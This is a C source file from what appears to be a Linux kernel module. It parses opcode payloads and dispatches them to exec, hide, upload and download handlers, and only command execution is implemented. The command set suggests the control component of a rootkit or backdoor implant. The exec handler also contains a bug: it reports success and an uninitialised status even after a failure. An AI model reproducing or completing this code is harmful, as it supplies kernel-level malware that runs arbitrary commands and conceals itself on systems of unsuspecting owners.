#include "commands.h"

#include <linux/module.h>
#include <linux/string.h>

#include "exec.h"

// Lenght of the shortest valid (opcode+args) combo. currently `hide`
#define SHORTEST_PAYLOAD 1

static void do_exec_sync(char *args, char *status_buf);
static void do_exec_async(char *args, char *status_buf);
static void do_hide(char *args, char *status_buf);
static void do_upload(char *args, char *status_buf);
static void do_download(char *args, char *status_buf);

// map each command type to it's callback
static cmd_callback cmd_callbacks[] = {
    [CMD_EXEC_SYNC] = do_exec_sync, //
    [CMD_EXEC_ASYNC] = do_exec_async, //
    [CMD_HIDE] = do_hide, //
    [CMD_UPLOAD] = do_upload, //
    [CMD_DOWNLOAD] = do_download, //
};

int cmd_build(struct command *cmd, const char *payload)
{
    unsigned long cmd_len; // length of full command (opcode + args)
    unsigned long args_len; // length of args part only (without space)
    int i;

    if (!cmd || !payload)
    {
        pr_err("commands: failed to build command: empty cmd/payload.\n");
        return ERR_EMPTY;
    }

    cmd_len = strlen(payload);
    if (cmd_len < SHORTEST_PAYLOAD)
    {
        pr_err("commands: failed to build command: payload is too short.\n");
        return ERR_BAD_ARGS;
    }

    cmd->type = CMD_UNKNOWN;
    for (i = 0; i < CMD_UNKNOWN; ++i)
    {
        // opcode is a positive int, which maps to enum values
        if (payload[0] == i + '0')
        {
            cmd->type = i;
        }
    }

    if (cmd->type == CMD_UNKNOWN)
    {
        pr_err("commands: failed to build command: invalid opcode.\n");
        return ERR_BAD_OPCODE;
    }

    cmd->callback = cmd_callbacks[cmd->type];

    // Hide doesn't take args
    if (cmd->type == CMD_HIDE)
    {
        return 0;
    }

    if (cmd_len <= 2)
    {
        pr_err("commands: failed to build command: expected arguments.\n");
        return ERR_NO_ARGS;
    }

    args_len = cmd_len - 2; // opcode + space
    if (args_len >= MAX_ARGS_LEN)
    {
        pr_err("commands: failed to build command: args are too long.\n");
        return ERR_LONG_ARGS;
    }
    strncpy(cmd->args, payload + 2, args_len);

    return 0;
}

static void do_exec_sync(char *args, char *status_buf)
{
    int status;
    int ret;

    if ((ret = exec_sync(args, &status)) != 0)
    {
        // exec didn't happen, return non-zero
        sprintf(status_buf, "couldn't exec `%s`. internal error code %d\n",
                args, ret);
    }
    sprintf(status_buf, "execed `%s` successfully. status: %d\n", args, status);
}

static void do_exec_async(char *args, char *status_buf)
{
    sprintf(status_buf, "exec_async is not implemented yet.\n");
    pr_err("commands: command exec_async is not implemented yet.\n");
}

static void do_hide(char *args, char *status_buf)
{
    sprintf(status_buf, "hide is not implemented yet.\n");
    pr_err("commands: command hide is not implemented yet.\n");
}

static void do_upload(char *args, char *status_buf)
{
    sprintf(status_buf, "upload is not implemented yet.\n");
    pr_err("commands: command upload is not implemented yet.\n");
}

static void do_download(char *args, char *status_buf)
{
    sprintf(status_buf, "download is not implemented yet.\n");
    pr_err("commands: command download is not implemented yet.\n");
}
